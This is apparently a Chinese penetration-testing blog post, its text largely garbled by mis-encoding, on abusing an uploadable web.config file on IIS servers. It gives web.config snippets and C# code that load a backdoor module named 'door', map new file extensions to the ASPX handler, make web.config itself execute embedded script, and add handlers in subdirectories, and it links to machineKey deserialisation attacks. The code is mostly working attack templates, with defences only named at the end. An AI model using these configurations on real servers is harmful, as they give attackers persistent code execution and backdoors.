---
title: IIS下web.config利用
url: https://guage.cool/iis-web-config.html
source: 半块西瓜皮
date: 2025-04-16
fetch_date: 2025-10-06T22:07:19.185801
---

# IIS下web.config利用

[![](/img/avatar.jpg)](/about/)[氓聧聤氓聺聴猫楼驴莽聯聹莽職庐](/)

忙虏隆忙聹聣忙聣戮氓聢掳氓聠聟氓庐鹿茂录聛

忙聹卢忙聳聡莽聸庐氓陆聲

1. [IIS茅聟聧莽陆庐氓聤聽猫陆陆忙碌聛莽篓聥](#IIS%E9%85%8D%E7%BD%AE%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B)
2. [忙聽鹿莽聸庐氓陆聲web.config氓聢漏莽聰篓](#%E6%A0%B9%E7%9B%AE%E5%BD%95web-config%E5%88%A9%E7%94%A8)
   1. [氓聤聽猫陆陆忙聣聵莽庐隆moudlue](#%E5%8A%A0%E8%BD%BD%E6%89%98%E7%AE%A1moudlue)
   2. [忙聵聽氓掳聞忙聣漏氓卤聲氓聬聧盲赂潞aspx](#%E6%98%A0%E5%B0%84%E6%89%A9%E5%B1%95%E5%90%8D%E4%B8%BAaspx)
   3. [web.config盲陆聹盲赂潞aspx](#web-config%E4%BD%9C%E4%B8%BAaspx)
   4. [machineKey氓聫聧氓潞聫氓聢聴氓聦聳](#machineKey%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96)
   5. [氓聢聸氓禄潞莽聸庐氓陆聲](#%E5%88%9B%E5%BB%BA%E7%9B%AE%E5%BD%95)
   6. [忙聹卢氓聹掳moudlue](#%E6%9C%AC%E5%9C%B0moudlue)
3. [氓颅聬莽聸庐氓陆聲web.config氓聢漏莽聰篓](#%E5%AD%90%E7%9B%AE%E5%BD%95web-config%E5%88%A9%E7%94%A8)
   1. [氓聤聽猫陆陆忙聣聵莽庐隆handlers](#%E5%8A%A0%E8%BD%BD%E6%89%98%E7%AE%A1handlers)
   2. [ISAPI Handlers](#ISAPI-Handlers)
4. [茅聵虏氓戮隆](#%E9%98%B2%E5%BE%A1)
   1. [allowSubDirConfig](#allowSubDirConfig)
   2. [lockItem](#lockItem)

氓聸聻氓聢掳茅隆露茅聝篓氓聫聜盲赂聨猫庐篓猫庐潞

[![](data:image/png;base64...)](https://github.com/howmp)[![](data:image/png;base64...)](https://weibo.com/howmp)[![](data:image/png;base64...)](https://guage.cool/atom.xml)![](data:image/png;base64...)

[盲赂禄茅隆碌](/)
[忙聳聡莽芦聽](/)[忙赂聴茅聙聫](/categories/%E6%B8%97%E9%80%8F/)

氓聫聭氓赂聝盲潞聨茂录職2025-04-15忙聸麓忙聳掳盲潞聨茂录職2025-04-15

# IIS盲赂聥web.config氓聢漏莽聰篓

氓陆聯茅聛聡氓聢掳氓聫炉盲禄楼猫娄聠莽聸聳/盲赂聤盲录聽web.config忙聴露茂录聦氓聫炉氓聫聜猫聙聝盲禄楼盲赂聥忙聳鹿氓录聫氓聢漏莽聰篓(氓聺聡氓聛聡猫庐戮IIS>=7)

# IIS茅聟聧莽陆庐氓聤聽猫陆陆忙碌聛莽篓聥

![config load flow](data:image/png;base64...)

茅聶陇盲潞聠莽陆聭莽芦聶忙聽鹿莽聸庐氓陆聲氓陇聳茂录聦氓颅聬莽聸庐氓陆聲盲鹿聼氓聫炉盲禄楼忙聹聣猫聡陋氓路卤莽職聞web.config茂录聦盲陆聠氓颅聬莽聸庐氓陆聲忙聹聣猫炉赂氓陇職茅聶聬氓聢露

# 忙聽鹿莽聸庐氓陆聲web.config氓聢漏莽聰篓

## 氓聤聽猫陆陆忙聣聵莽庐隆moudlue

茅聶聬氓聢露茂录職

1. 氓驴聟茅隆禄盲赂潞茅聸聠忙聢聬忙篓隆氓录聫
2. 氓聫炉盲赂聤盲录聽dll氓聢掳bin莽聸庐氓陆聲

忙鲁篓忙聞聫:modules盲赂聧猫聝陆氓聹篓氓颅聬莽聸庐氓陆聲莽職聞web.config茅聟聧莽陆庐

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 ``` | ``` <configuration>     <system.webServer>       <modules>          <add name="door" type="IIS.Module"/>       </modules>     </system.webServer> </configuration> ``` |

盲禄楼盲赂聥盲禄拢莽聽聛莽录聳猫炉聭盲赂潞dll盲赂聤盲录聽氓聢掳bin莽聸庐氓陆聲

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 ``` | ``` using System; using System.Collections.Generic; using System.Text; using System.Web;  namespace IIS {     class Module : IHttpModule     {         public void Dispose()         {         }          public void Init(HttpApplication context)         {             context.BeginRequest += Context_BeginRequest;         }         private void Context_BeginRequest(object sender, EventArgs e)         {             HttpApplication httpApplication = (HttpApplication)sender;             HttpContext context = httpApplication.Context;             if (context.Request.Path.Contains("door"))             {                 context.Response.Write("hello world");                 context.Response.End();                 context.Response.Close();                 httpApplication.CompleteRequest();                 return;             }         }     } } ``` |

![module](data:image/png;base64...)

## 忙聵聽氓掳聞忙聣漏氓卤聲氓聬聧盲赂潞aspx

忙鲁篓忙聞聫:buildProviders盲赂聧猫聝陆氓聹篓氓颅聬莽聸庐氓陆聲莽職聞web.config茅聟聧莽陆庐

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 ``` | ``` <configuration>     <system.web>         <compilation>             <buildProviders>                 <add extension=".atxt" type="System.Web.Compilation.PageBuildProvider" />             </buildProviders>         </compilation>     </system.web>     <system.webServer>         <handlers>             <add name="SampleHandler" path="*.atxt" verb="*" type="System.Web.UI.PageHandlerFactory"/>         </handlers>     </system.webServer> </configuration> ``` |

![handler](data:image/png;base64...)

## web.config盲陆聹盲赂潞aspx

忙鲁篓忙聞聫:buildProviders盲赂聧猫聝陆氓聹篓氓颅聬莽聸庐氓陆聲莽職聞web.config茅聟聧莽陆庐

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 ``` | ``` <?xml version="1.0" encoding="UTF-8"?> <configuration>     <system.webServer>         <handlers accessPolicy="Read, Script, Write">             <add name="web_config" path="web.config" verb="*" type="System.Web.UI.PageHandlerFactory" modules="ManagedPipelineHandler" requireAccess="Script" preCondition="integratedMode" />              <add name="web_config-Classic" path="web.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\Microsoft.NET\Framework64\v4.0.30319\aspnet_isapi.dll" requireAccess="Script" preCondition="classicMode,runtimeVersionv4.0,bitness64" />          </handlers>         <security>             <requestFiltering>                 <fileExtensions>                     <remove fileExtension=".config" />                 </fileExtensions>                 <hiddenSegments>                     <remove segment="web.config" />                 </hiddenSegments>             </requestFiltering>         </security>         <validation validateIntegratedModeConfiguration="false" />      </system.webServer>     <system.web>         <compilation defaultLanguage="vb">             <buildProviders> <add extension=".config" type="System.Web.Compilation.PageBuildProvider" /> </buildProviders>         </compilation>         <httpHandlers>              <add path="web.config" type="System.Web.UI.PageHandlerFactory" verb="*" />          </httpHandlers>      </system.web> </configuration> <!-- ASP.NET code comes here! It should not include HTML comment closing tag and double dashes!  <% Response.write("-"&"->") Response.write("hello world") Response.write("<!-"&"-") %> --> ``` |

![web.config as aspx](data:image/png;base64...)

<https://soroush.me/blog/tag/web-config>

## machineKey氓聫聧氓潞聫氓聢聴氓聦聳

茅聙職猫驴聡web.config猫庐戮莽陆庐machineKey茂录聦茅聙職猫驴聡氓聫聧莽鲁禄氓聢聴氓聦聳忙聣搂猫隆聦盲禄禄忙聞聫盲禄拢莽聽聛

<https://soroush.me/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/>

## 氓聢聸氓禄潞莽聸庐氓陆聲

氓聢聸氓禄潞莽聸庐氓陆聲d:\xxx

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 ``` | ``` <configuration>   <location path=".">     <system.webServer>       <directoryBrowse enabled="true" />     </system.webServer>   </location>     <system.web>         <customErrors mode="Off"/> 		<compilation tempDirectory="d:\xxx" />     </system.web> </configuration> ``` |

## ~~忙聹卢氓聹掳moudlue~~

忙聽鹿忙聧庐氓戮庐猫陆炉忙聳聡忙隆拢茂录聦忙聹卢氓聹掳忙篓隆氓聺聴茅聹聙猫娄聛氓聟聢忙鲁篓氓聠聦忙聣聧猫聝陆盲陆驴莽聰篓

忙鲁篓氓聠聦氓聬聨茅聟聧莽陆庐盲驴聺氓颅聵氓聹篓`%windir%\system32\inetsrv\config\applicationhost.config`

![local module](data:image/png;base64...)

<https://learn.microsoft.com/en-us/iis/get-started/introduction-to-iis/iis-modules-overview>

# 氓颅聬莽聸庐氓陆聲web.config氓聢漏莽聰篓

## 氓聤聽猫陆陆忙聣聵莽庐隆handlers

茅聶聬氓聢露茂录職

1. 猫娄聛盲赂聤盲录聽dll氓聢掳忙聽鹿莽聸庐氓陆聲盲赂聥bin莽聸庐氓陆聲
2. 氓驴聟茅隆禄盲赂潞茅聸聠忙聢聬忙篓隆氓录聫
3. web.config氓聫炉盲赂聤盲录聽盲禄禄忙聞聫莽聸庐氓陆聲茂录聦忙炉聰氓娄聜盲潞聦莽潞搂莽聸庐氓陆聲

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 ``` | ``` <configuration>       <system.webServer>         <handlers>             <add name="h" type="IIS.Handle" verb="*" path="h"/>         </handlers>     </system.webServer> </configuration> ``` |

盲禄楼盲赂聥盲禄拢莽聽聛莽录聳猫炉聭盲赂潞dll盲赂聤盲录聽氓聢掳bin莽聸庐氓陆聲

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 ``` | ``` using System.Web;  namespace IIS {     public class Handle : IHttpHandler     {         public bool IsReusable => true;          public void ProcessRequest(HttpContext context)         {             context.Response.Write("hello world");             context.Response.End();             context.Response.Close();         }     } } ``` |

![subdir handler](data:image/png;base64...)

## ~~ISAPI Handlers~~

ISAPI氓陇聞莽聬聠氓聶篓茅聹聙猫娄聛氓聟聢忙鲁篓氓聠聦/氓聟聛猫庐赂忙聣聧盲录職莽聰聼忙聲聢茂录聦猫驴聶莽搂聧忙聳鹿忙鲁聲盲赂聧氓楼聫忙聲聢

|  |  |
| --- | --- |
| ``` 1 2 3 4 5 6 7 8 ``` | ``` <?xml version="1.0" encoding="UTF-8"?> <configuration>    <system.webServer>       <handlers accessPolicy="Read, Script, Write">          <add name="web_config" path="*.txt" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\xxx.dll" resourceType="Unspecified" requireAccess="None" preCondition="bitness64" />               </handlers>    </system.webServer> </configuration> ``` |

...